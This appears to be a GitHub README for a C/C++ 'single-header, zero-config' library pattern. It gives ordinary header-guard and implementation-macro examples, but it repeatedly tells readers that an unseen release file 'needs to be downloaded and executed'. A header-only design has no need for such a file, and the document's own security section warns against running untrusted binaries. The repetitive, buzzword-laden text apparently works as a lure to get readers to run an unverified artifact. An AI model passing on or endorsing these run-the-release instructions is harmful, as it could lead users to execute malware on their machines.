[![Releases](https://img.shields.io/badge/Releases-click-blue?logo=github)](https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases)

# Single-Header Zero-Config Universal Library Inclusion System

![single header illustration](https://img.shields.io/badge/Single--Header-Lightgrey) ![zero config](https://img.shields.io/badge/Zero--Config-green) ![header-only](https://img.shields.io/badge/Header--Only-blue)

Quick links
- Releases page (download and run the release file): https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases
- Repository topics: automation, build-system, c-libraries, c99, cpp, cpp17, cross-platform, dependency-free, genius-code, hack, header-only, innovative, magic, minimal-library, no-dependencies, revolution, sdl2, single-header, tiny-library, zero-config

Badges
- Buildless. Header-only. No linkers.
- Works with C99 and C++17.
- Cross-platform. No external deps.

Overview

This project gives a pattern and a tiny runner to pack entire C and C++ libraries into a single header. The run-time and compile-time surface stay small. The code uses preprocessor tricks and controlled macros to include implementation sections on demand. It removes the need for .a, .so, DLL, or a separate build system. You include one header. You define one macro. You compile. You run.

Design goals
- Zero config. No build scripts. No make, cmake, or ninja.
- Single header. One file per library distribution.
- Cross-platform. Windows, Linux, macOS, BSD.
- C-first. Support C99 idioms and C++17 wrappers.
- Minimal runtime overhead.
- Predictable symbol scopes.
- Easy packaging for small libs and bindings.

Why this matters

Many small libraries ship as source plus build files. That adds friction. Developers must manage build files, linkers, and binary compatibility. A single-header pattern lets the library author control integration points. The user gets a compact file that works with plain compilers.

Key concepts

- Implementation macro: The header defines API prototypes and inline functions. When a source translation unit defines a specific macro, the header emits the implementation. This mirrors the single-file pattern used by several popular libs.
- Translation unit control: The header avoids duplicate symbols by requiring exactly one translation unit to define the implementation macro.
- Symbol hiding: The header uses static inline, and conditional static declaration for C, and unnamed namespaces or inline variables for C++ when appropriate.
- Feature macros: The header exposes macros to toggle optional features at compile time.
- Platform switches: The header uses #if defined(_WIN32) etc. to provide platform-specific code in the same file.
- No external build: The header relies on compiler flags and standard headers only.

Core pattern (conceptual)
- Part A: Declarations and inlines guarded by header guard.
- Part B: Implementation block compiled only if IMPLEMENTATION macro is defined in one translation unit.
- Part C: Optional tools or meta-data included when TOOLING macro is set.

This repo includes a small helper script in Releases. Download the release artifact and run it to generate or extract prebuilt single-header packages. The release file needs to be downloaded and executed.

How the single-header works

Guard layout
- #ifndef LIB_NAME_H
- #define LIB_NAME_H
- API declarations
- Inline helpers
- Optionally: small inline implementations
- #ifdef LIB_NAME_IMPLEMENTATION
- Full implementation code
- #endif
- #endif

API vs. implementation

Declaration sections provide stable API. Implementations may include static or global variables. The pattern ensures users cannot include the header in multiple translation units with IMPLEMENTATION defined at the same time.

C vs C++ behavior

C:
- Use static inline or extern function declarations per C99.
- Use a macro for visibility control when required.

C++:
- Use inline functions and templates.
- Use inline variables where needed (C++17).
- Wrap C API with extern "C" when the implementation provides C-compatible symbols.

Examples

C example

Header usage:
```c
/* mylib.h */
#ifndef MYLIB_H
#define MYLIB_H

#ifdef __cplusplus
extern "C" {
#endif

int mylib_add(int a, int b);

#ifdef __cplusplus
}
#endif

#ifdef MYLIB_IMPLEMENTATION

int mylib_add(int a, int b) {
    return a + b;
}

#endif /* MYLIB_IMPLEMENTATION */
#endif /* MYLIB_H */
```

Source with implementation:
```c
#define MYLIB_IMPLEMENTATION
#include "mylib.h"

int main(void) {
    int r = mylib_add(2, 3);
    return r == 5 ? 0 : 1;
}
```

Multiple translation units:
- Include the header normally in all TUs.
- Define MYLIB_IMPLEMENTATION in exactly one TU.

C++ example

Header usage:
```cpp
// mylib.hpp
#ifndef MYLIB_HPP
#define MYLIB_HPP

#include <string>

namespace mylib {

inline int add(int a, int b) {
    return a + b;
}

} // namespace mylib

#ifdef MYLIB_IMPL
namespace mylib {
    // Additional heavy code here, only when MYLIB_IMPL is defined
}
#endif

#endif // MYLIB_HPP
```

Source with implementation:
```cpp
#define MYLIB_IMPL
#include "mylib.hpp"

#include <iostream>

int main() {
    std::cout << mylib::add(4, 5) << "\n";
    return 0;
}
```

Integration patterns

1) App-level integration
- Add header to project include path.
- Pick one source file.
- Define IMPLEMENTATION macro for that header.
- Compile all TUs normally.

2) Library bundling
- Put header in a vendor/ directory.
- Use a single TU to include implementation macro.
- Use as a drop-in header across targets.

3) Multiple libraries
- Ensure unique implementation macro names per header.
- Example: LIBA_IMPL, LIBB_IMPLEMENTATION.

Advanced patterns

Conditional compilation and feature toggles
- The header can define option macros like LIB_OPT_FAST_MATH.
- Users can define these macros before including the header to enable code paths.

Versioning and backward compatibility
- Embed a semantic version macro, e.g., LIB_VER_MAJOR, LIB_VER_MINOR.
- The header exposes configuration macros to maintain binary compatibility.

Memory and allocation hooks
- Expose hooks for malloc/free to allow custom allocators.
- Use macros or function pointers.
- Provide safe defaults that use stdlib or malloc.

Platform specifics

Windows
- Use __declspec(dllexport) and __declspec(dllimport) only when building as DLL. Avoid them for header-only usage.
- Use wide-character APIs where needed.

POSIX
- Use POSIX APIs under #if defined(__unix__) or defined(__linux__).
- Use syscalls only in implementation block.

macOS
- Use mach APIs when needed under platform guards.

Symbol visibility

- Avoid global symbols except for the required API.
- Use static inline in C to avoid external linkage.
- Use anonymous namespace or inline variables in C++ to avoid ODR violations.

Packaging strategy

One release artifact can contain many single-header libraries. Each header stays self-contained. The release may provide:
- A tarball with headers.
- A generator script that can produce single-header files from source trees.
- A metadata JSON that lists includes, features, and compile-time flags.

Releases and tooling

Go to the Releases page to download the release artifact. The release file needs to be downloaded and executed. The release contains helper scripts and prebuilt single-header packages. Use that download to extract or generate headers.

Releases link: https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases

Badge for the release download
- The top of this file links to the release.
- The release file must be obtained and executed as explained above.

Quick start: generate headers from the release (example flow)

1) Download the release package to your project root.
2) Run the release executable or script. It extracts header files.
3) Move desired header(s) into your include/ or vendor/ directory.
4) Define the implementation macro in one source file.
5) Compile.

Example commands (shell)
```sh
# Download the release artifact with curl (URL is on the Releases page)
curl -L -o single-headers.tar.gz "https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases/download/v1.0/single-headers.tar.gz"

# Extract
tar -xzf single-headers.tar.gz -C vendor/

# Use a header, define implementation in one TU
gcc -std=c99 -Ivendor main.c -o app
```

API style guidelines for authors

Public API surface
- Keep API minimal.
- Expose only what users need.
- Use prefixed names for functions and macros to avoid collisions.

Error reporting
- Return error codes or boolean status in C APIs.
- Use exceptions sparingly in C++ wrappers.

Thread safety
- Document thread safety of each function.
- Avoid global mutable state when possible.
- If globals exist, provide init, shutdown, and thread-safe accessors.

Macros and naming
- Use clear macro names like LIBNAME_IMPLEMENTATION.
- Provide a guard macro LIBNAME_H to prevent double inclusion.
- Provide version macros LIBNAME_VERSION_MAJOR, LIBNAME_VERSION_MINOR.

Testing and CI

Local tests
- Include example TUs that define the implementation macro and run core paths.
- Compile with -Wall -Wextra.

Cross-platform CI
- Set up matrix builds for Linux, Windows, macOS with C and C++ compilers.
- Test with clang and gcc.

Performance

Inlining and thin wrappers
- Use static inline for small functions in C.
- Use inline in C++ for small wrappers.
- Avoid heavy code inside inlines when it grows binary size.

Compiling time
- Keep headers compact.
- Avoid including heavy third-party headers unless in implementation blocks.

Large code paths
- Place heavy algorithms inside the implementation block guarded by implementation macro so they compile only in one TU.

Examples and demos

SDL2 single-header wrapper (concept)
- Provide minimal set of SDL functionality as inline wrappers.
- Use runtime detection for available video drivers.
- Expose a simple init/quit API.

Example SDL2 header snippet
```c
#ifndef SSDL_H
#define SSDL_H

#ifdef __cplusplus
extern "C" {
#endif

int ssdl_init(unsigned int flags);
void ssdl_quit(void);

#ifdef __cplusplus
}
#endif

#ifdef SSDL_IMPLEMENTATION

#include <SDL.h>

int ssdl_init(unsigned int flags) {
    if (SDL_Init(flags) != 0) {
        return -1;
    }
    return 0;
}

void ssdl_quit(void) {
    SDL_Quit();
}

#endif /* SSDL_IMPLEMENTATION */
#endif /* SSDL_H */
```

This pattern lets you wrap library calls and provide a minimal surface for your app.

Packaging large libraries

Not all libraries fit a single header naturally. For larger code bases:
- Create a thin single-header shim that includes only the necessary API.
- Implement heavy parts in separate files but offer a generated header version for convenience.
- Provide both single-header and modulared source options in releases.

Security considerations

- Avoid executing untrusted binaries from the Releases page. Prefer to inspect release contents.
- Prefer source tarballs and inspect code before running.
- Run releases in a sandbox when possible.

Contribution

How to contribute code
- Fork the repo.
- Make a feature branch.
- Add tests for new functionality.
- Keep changes modular and documented.

Issue reports
- Provide a minimal reproducer.
- State OS, compiler, and command line used.
- Link to the header and example code.

Pull request checklist
- CI passes across targets.
- New tests cover the change.
- Documentation updates included.

Maintainers

The project follows a small core team model. Maintainers review changes and test across a set of target compilers and platforms. They accept small focused PRs that follow the single-header philosophy.

Licensing

- The code in this repo uses a permissive license by default (MIT or similar) to encourage reuse.
- Each single-header file includes a short license header.
- Authors can choose to embed other licenses per header, but they must declare them clearly.

Common pitfalls and solutions

Duplicate implementation
- Problem: Multiple TUs define the implementation macro.
- Solution: Ensure only one TU defines it. Add a build guard that sets a compile error if multiple definitions occur.

Symbol collisions
- Problem: Unnamed symbols collide across headers.
- Solution: Prefix symbols and macros. Use static inline, anonymous namespaces, and inline variables.

Heavy includes in header
- Problem: Header includes heavy platform-specific headers even when not needed.
- Solution: Move heavy includes inside implementation block.

Compilation macros missing
- Problem: Users forget to define optional macros before include.
- Solution: Document macros at the top of the header and provide defaults.

FAQ

Q: How do I handle multiple headers in one project?
A: Use unique IMPLEMENTATION macros for each header. Define each implementation in separate TUs, or consolidate all implementations into one TU.

Q: Can I use this pattern for libraries that need dynamic loading?
A: Yes. The single-header can provide a thin wrapper that uses dlopen or LoadLibrary in its implementation section. Guard platform-specific dynamic loader code behind macros.

Q: How do I debug inside the header implementation?
A: Compile with -g and enable compiler diagnostic flags. Use conditional debug macros in the header to expose diagnostic output.

Q: Will it increase binary size?
A: Inlining small utilities reduces overhead. Large algorithms in implementation sections increase binary size in the TU where they appear. Use linker-level optimizations to strip unused code.

Q: Are there limitations for C++ templates?
A: Templates typically require header-only definitions. The pattern suits template code well. Move algorithm implementations into templates or inline functions.

Templates and inline strategy

- Templates must live in headers.
- Provide template specializations carefully.
- Use explicit instantiation in a TU only when needed to reduce compile time.

Build matrix suggestions

- C99: gcc -std=c99 -O2 -Wall
- C++17: g++ -std=c++17 -O2 -Wall
- Windows MSVC: cl.exe /std:c++17 /O2

Release artifacts

A typical release includes:
- single-headers.tar.gz with many header files
- a small helper executable or script that can merge or generate headers
- examples/ folder with sample apps
- LICENSE file
- README and changelog

The release file needs to be downloaded and executed. Visit the Releases page, pick the artifact, and run the included script to extract headers.

Maintenance and lifecycle

- Keep headers small and focused.
- Avoid frequent breaking API changes.
- Use semantic versioning for major changes.
- Provide migration notes in the changelog.

Workflows and CI tips

- Use compile-time feature testing in CI.
- Run static analyzers on header code.
- Run tests with sanitizers (ASAN, UBSAN) on implementation TUs.

Developer notes on creating headers

1) Start with header guard and API declarations.
2) Add inline helpers and doc comments.
3) Add implementation block guarded by a clear macro.
4) Test by compiling a minimal program with IMPLEMENTATION defined.
5) Add example TUs and unit tests.

Example of mini-library lifecycle

- Author writes modular code.
- Author extracts public API to a header.
- Author places heavy code in implementation block.
- Author publishes a single-header release and small tool to regenerate or update the header.

Tooling and automation

The releases include a small tool that can:
- Inline multiple source files into a single header.
- Normalize include guards and macros.
- Generate example TUs for C and C++.
- Optionally minify or annotate the header for clarity.

This tool must be downloaded and executed from the Releases page.

Security checklist for release artifacts
- Sign releases or provide checksums.
- Provide source archives in addition to binaries.
- Encourage users to inspect the header and run it in controlled environments.

Integrations

- Use with embedded projects by copying headers.
- Use with game engines for small utilities.
- Use for CLI tools to pack helper libraries without a build system.

Examples folder (recommended)
- examples/c-demo
- examples/cpp-demo
- examples/sdl-demo
Each example shows how to define the implementation macro and compile across compilers.

Documentation style

- Keep docs inside headers as short comments.
- Provide a main README (this file) with examples.
- Provide a small API reference with function signatures and macros.

Versioning and release notes

Follow semantic versioning:
- MAJOR for incompatible API changes.
- MINOR for backwards-compatible features.
- PATCH for bug fixes.

Include migration guides on major changes.

Acknowledgments and references

- The single-header pattern builds on community practices.
- Many open-source projects use a similar scheme for compact distribution.
- The Releases page contains utilities and prebuilt headers.

Releases and downloads

Download the release artifact and run it. The release file needs to be downloaded and executed.

Releases page: https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases

Contact and support

- Open issues on GitHub for bugs or feature requests.
- Submit pull requests for improvements and examples.
- Use the Releases page to obtain tool artifacts and packaged headers.

Appendix: reference macros and idioms

Common header top:

```c
#ifndef LIBNAME_H
#define LIBNAME_H

#ifdef __cplusplus
extern "C" {
#endif

/* API prototypes */

#ifdef __cplusplus
}
#endif

/* implementation guard */
#ifdef LIBNAME_IMPLEMENTATION

/* implementation code */

#endif /* LIBNAME_IMPLEMENTATION */

#endif /* LIBNAME_H */
```

Unique implementation macro example:
- LIBNAME_IMPLEMENTATION
- LIBNAME_IMPL
- LIBNAME_SINGLE_HEADER_IMPLEMENTATION

Minimal checklist before publishing a header
- Ensure header guard uniqueness.
- Document macros and their default values.
- Provide example for C and C++ use.
- Provide tests and examples in the release.

Images and visuals

- Use badges and shields to show release link and topics.
- Include small diagrams in docs or the wiki to show implementation flow.

This README connects to the releases page. Download the release artifacts and run the included tool or extract the headers. The release file needs to be downloaded and executed. For specifics, visit the releases page and pick the artifact that matches your workflow.

Releases link (again for convenience):
https://github.com/coolbae/Single-Header-Zero-Config-Universal-Library-Inclusion-System-for-C-CPP-No-Build-Files-818b-Magic/releases